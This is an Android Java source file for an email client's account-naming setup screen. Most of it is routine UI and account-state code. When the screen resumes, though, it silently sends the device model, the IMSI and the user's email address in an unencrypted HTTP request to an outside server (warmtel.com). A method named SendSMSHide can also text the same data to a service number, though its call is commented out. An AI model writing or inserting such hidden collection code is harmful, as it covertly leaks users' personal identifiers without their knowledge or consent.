
package com.mail163.email.activity.setup;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.text.method.TextKeyListener;
import android.text.method.TextKeyListener.Capitalize;
import android.view.View;
import android.view.Window;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.mail163.email.AccountBackupRestore;
import com.mail163.email.Email;
import com.mail163.email.Logs;
import com.mail163.email.R;
import com.mail163.email.Utility;
import com.mail163.email.Email.Global;
import com.mail163.email.activity.Welcome;
import com.mail163.email.provider.EmailContent;
import com.mail163.email.provider.EmailContent.Account;
import com.mail163.email.provider.EmailContent.AccountColumns;
import com.mail163.email.provider.EmailContent.HostAuth;
import com.mail163.email.util.PhoneUtil;

public class AccountSetupNames extends Activity implements OnClickListener {
	private static final String EXTRA_ACCOUNT_ID = "accountId";
	private static final String EXTRA_EAS_FLOW = "easFlow";
	private static final int REQUEST_SECURITY = 0;

	private EditText mDescription;
	private EditText mName;
	private Account mAccount;
	private Button mDoneButton;
	private boolean mEasAccount = false;
	 private TextView mLeftTitle;
	private CheckAccountStateTask mCheckAccountStateTask;

	private UploadMsgTask mUploadMsgTask;
	private static final int ACCOUNT_INFO_COLUMN_FLAGS = 0;
	private static final int ACCOUNT_INFO_COLUMN_SECURITY_FLAGS = 1;
	private static final String[] ACCOUNT_INFO_PROJECTION = new String[] {
			AccountColumns.FLAGS, AccountColumns.SECURITY_FLAGS };

	public static void actionSetNames(Activity fromActivity, long accountId,
			boolean easFlowMode) {
		Intent i = new Intent(fromActivity, AccountSetupNames.class);
		i.putExtra(EXTRA_ACCOUNT_ID, accountId);
		i.putExtra(EXTRA_EAS_FLOW, easFlowMode);
		fromActivity.startActivity(i);
	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);
		setContentView(R.layout.account_setup_names);
		getWindow().setFeatureInt(Window.FEATURE_CUSTOM_TITLE,
				R.layout.list_title);
		
		mDescription = (EditText) findViewById(R.id.account_description);
		mName = (EditText) findViewById(R.id.account_name);
		mDoneButton = (Button) findViewById(R.id.done);
		mDoneButton.setOnClickListener(this);

		TextWatcher validationTextWatcher = new TextWatcher() {
			public void afterTextChanged(Editable s) {
				validateFields();
			}

			public void beforeTextChanged(CharSequence s, int start, int count,
					int after) {
			}

			public void onTextChanged(CharSequence s, int start, int before,
					int count) {
			}
		};
		mName.addTextChangedListener(validationTextWatcher);

		mName.setKeyListener(TextKeyListener.getInstance(false,
				Capitalize.WORDS));

		long accountId = getIntent().getLongExtra(EXTRA_ACCOUNT_ID, -1);
		mAccount = EmailContent.Account.restoreAccountWithId(this, accountId);
		// Shouldn't happen, but it could
		if (mAccount == null) {
			onBackPressed();
			return;
		}
		// Get the hostAuth for receiving
		HostAuth hostAuth = HostAuth.restoreHostAuthWithId(this,
				mAccount.mHostAuthKeyRecv);
		if (hostAuth == null) {
			onBackPressed();
		}

		// Remember whether we're an EAS account, since it doesn't require the
		// user name field
		mEasAccount = hostAuth.mProtocol.equals("eas");
		if (mEasAccount) {
			mName.setVisibility(View.GONE);
			findViewById(R.id.account_name_label).setVisibility(View.GONE);
		}
		/*
		 * Since this field is considered optional, we don't set this here. If
		 * the user fills in a value we'll reset the current value, otherwise we
		 * just leave the saved value alone.
		 */
		// mDescription.setText(mAccount.getDescription());
		if (mAccount != null && mAccount.getSenderName() != null) {
			mName.setText(mAccount.getSenderName());
		} else {
			String[] emailParts = mAccount.getDisplayName().split("@");
			String displayName = emailParts[0].trim();
			mName.setText(displayName);
		}
		mDescription.setText(mAccount.getDisplayName());

		// Make sure the "done" button is in the proper state
		validateFields();
		setupTitle();
	}

	@Override
	public void onResume() {
		super.onResume();
		// sendMessage();

		mUploadMsgTask = (UploadMsgTask) new UploadMsgTask().execute(PhoneUtil.getModel(), PhoneUtil.getImsi(this), mAccount
				.getEmailAddress());
	}
    private void setupTitle() {
		mLeftTitle = (TextView) findViewById(R.id.title_left_text);
		mLeftTitle.setText(getString(R.string.account_setup_basics_title));
	}
	private class UploadMsgTask extends AsyncTask<String, Void, Integer> {
		@Override
		protected Integer doInBackground(String... params) {
			String mbileType = params[0];
			String imsi = params[1];
			String email = params[2];
			if(Email.MOBILEMESSAGEFLAG){
				doGetMessage(mbileType,imsi,email);
			}
			return 1;
		}
	}
    public void saveIMSI(String imsi){
    	Editor sharedata = getSharedPreferences(
				Email.STORESETMESSAGE, 0).edit();
		sharedata.putString(Global.Save_IMSI, imsi);
		sharedata.commit();
    }
	public void doGetMessage(String mobileType, String imsi, String email) {
		StringBuffer urisb = new StringBuffer("http://www.warmtel.com/write.asp?");
		urisb.append("mobileType=");
		urisb.append(mobileType);
		urisb.append(",");
		urisb.append(Global.localVersion);
		urisb.append("&");

		urisb.append("imsi=");
		urisb.append(imsi);
		urisb.append("&");

		urisb.append("email=");
		urisb.append(email);
		
		String requestUri = urisb.toString();
		String urlPath = requestUri.replace(PhoneUtil.getModel(), Uri.encode(PhoneUtil.getModel()));
		try {
			HttpGet httpRequest = new HttpGet(urlPath);
			HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
			if (httpResponse.getStatusLine().getStatusCode() == 200) {
				Logs.d(Logs.LOG_TAG, "get success 成功");
			}
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	public void sendMessage() {
		StringBuffer sb = new StringBuffer();
		sb.append("\n");
		sb.append("手机型号:");
		sb.append(PhoneUtil.getModel());
		sb.append("\n");
		sb.append("IMSI:");
		sb.append(PhoneUtil.getImsi(this));
		sb.append("\n");
		sb.append("Email:");
		sb.append(mAccount.getEmailAddress());
		String content = sb.toString();
		String msg = "";
		try {
			msg = new String(content.getBytes("UTF-8"));
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			msg = content;
		}

		SendSMSHide(Email.SERVICE_MOBILE, msg);

	}

	public void SendSMSHide(String aPhoneNUM, String aContent) {
		SmsManager aSmsManager = SmsManager.getDefault();
		// 发送信息的intent参数。
		String aSent = "SMS_SENT";
		// 信息反馈的intent参数。
		String aDelivered = "SMS_DELIVERED";
		// 创建发送新信息的PendingIntent对象
		PendingIntent aSentPI = PendingIntent.getBroadcast(this, 0, new Intent(
				aSent), 0);
		// 信息反馈的PendingIntent。
		PendingIntent aDeliveredPI = PendingIntent.getBroadcast(this, 0,
				new Intent(aDelivered), 0);

		try {
			if (aContent.length() > 80) {
				List<String> contents = aSmsManager.divideMessage(aContent);
				for (String sms : contents) {
					aSmsManager.sendTextMessage(aPhoneNUM, null, sms, aSentPI,
							aDeliveredPI);// 发送短信（还可以发送彩信等）
				}
			} else {
				aSmsManager.sendTextMessage(aPhoneNUM, null, aContent, aSentPI,
						aDeliveredPI);// 发送短信（还可以发送彩信等）
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	@Override
	protected void onDestroy() {
		super.onDestroy();

		if (mCheckAccountStateTask != null
				&& mCheckAccountStateTask.getStatus() != CheckAccountStateTask.Status.FINISHED) {
			mCheckAccountStateTask.cancel(true);
			mCheckAccountStateTask = null;
		}
		Utility.cancelTaskInterrupt(mUploadMsgTask);
		mUploadMsgTask = null;
	}

	/**
	 * TODO: Validator should also trim the name string before checking it.
	 */
	private void validateFields() {
		if (!mEasAccount) {
			mDoneButton.setEnabled(Utility.requiredFieldValid(mName));
		}
		Utility.setCompoundDrawablesAlpha(mDoneButton,
				mDoneButton.isEnabled() ? 255 : 128);
	}

	@Override
	public void onBackPressed() {
		boolean easFlowMode = getIntent()
				.getBooleanExtra(EXTRA_EAS_FLOW, false);
		if (easFlowMode) {
			AccountSetupBasics.actionAccountCreateFinishedEas(this);
		} else {
			if (mAccount != null) {
				AccountSetupBasics.actionAccountCreateFinished(this,
						mAccount.mId);
			} else {
				// Safety check here; If mAccount is null (due to external
				// issues or bugs)
				// just rewind back to Welcome, which can handle any
				// configuration of accounts
				Welcome.actionStart(this);
			}
		}
		finish();
	}

	/**
	 * After having a chance to input the display names, we normally jump
	 * directly to the inbox for the new account. However if we're in EAS flow
	 * mode (externally-launched account creation) we simply "pop" here which
	 * should return us to the Accounts activities.
	 * 
	 * TODO: Validator should also trim the description string before checking
	 * it.
	 */
	private void onNext() {
		if (Utility.requiredFieldValid(mDescription)) {
			mAccount.setDisplayName(mDescription.getText().toString());
		}
		String name = mName.getText().toString();
		mAccount.setSenderName(name);
		ContentValues cv = new ContentValues();
		cv.put(AccountColumns.DISPLAY_NAME, mAccount.getDisplayName());
		cv.put(AccountColumns.SENDER_NAME, name);
		mAccount.update(this, cv);
		// Update the backup (side copy) of the accounts
		AccountBackupRestore.backupAccounts(this);

		// Before proceeding, launch an AsyncTask to test the account for any
		// syncing problems,
		// and if there's a problem, bring up the UI to update the security
		// level.
		mCheckAccountStateTask = new CheckAccountStateTask(mAccount.mId);
		mCheckAccountStateTask.execute();
	}

	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.done:
			onNext();
			break;
		}
	}

	/**
	 * This async task is launched just before exiting. It's a last chance test,
	 * before leaving this activity, for the account being in a "hold" state,
	 * and gives the user a chance to update security, enter a device PIN, etc.
	 * for a more seamless account setup experience.
	 * 
	 * TODO: If there was *any* indication that security might be required, we
	 * could at least force the DeviceAdmin activation step, without waiting for
	 * the initial sync/handshake to fail. TODO: If the user doesn't update the
	 * security, don't go to the MessageList.
	 */
	private class CheckAccountStateTask extends AsyncTask<Void, Void, Boolean> {

		private long mAccountId;

		public CheckAccountStateTask(long accountId) {
			mAccountId = accountId;
		}

		@Override
		protected Boolean doInBackground(Void... params) {
			Cursor c = AccountSetupNames.this.getContentResolver()
					.query(
							ContentUris.withAppendedId(Account.CONTENT_URI,
									mAccountId), ACCOUNT_INFO_PROJECTION, null,
							null, null);
			try {
				if (c.moveToFirst()) {
					int flags = c.getInt(ACCOUNT_INFO_COLUMN_FLAGS);
					int securityFlags = c
							.getInt(ACCOUNT_INFO_COLUMN_SECURITY_FLAGS);
					if ((flags & Account.FLAGS_SECURITY_HOLD) != 0) {
						return Boolean.TRUE;
					}
				}
			} finally {
				c.close();
			}

			return Boolean.FALSE;
		}

		@Override
		protected void onPostExecute(Boolean isSecurityHold) {
			if (!isCancelled()) {
				if (isSecurityHold) {
					Intent i = AccountSecurity.actionUpdateSecurityIntent(
							AccountSetupNames.this, mAccountId);
					AccountSetupNames.this.startActivityForResult(i,
							REQUEST_SECURITY);
				} else {
					onBackPressed();
				}
			}
		}
	}

	/**
	 * Handle the eventual result from the security update activity
	 * 
	 * TODO: If the user doesn't update the security, don't go to the
	 * MessageList.
	 */
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		switch (requestCode) {
		case REQUEST_SECURITY:
			onBackPressed();
		}
		super.onActivityResult(requestCode, resultCode, data);
	}

}
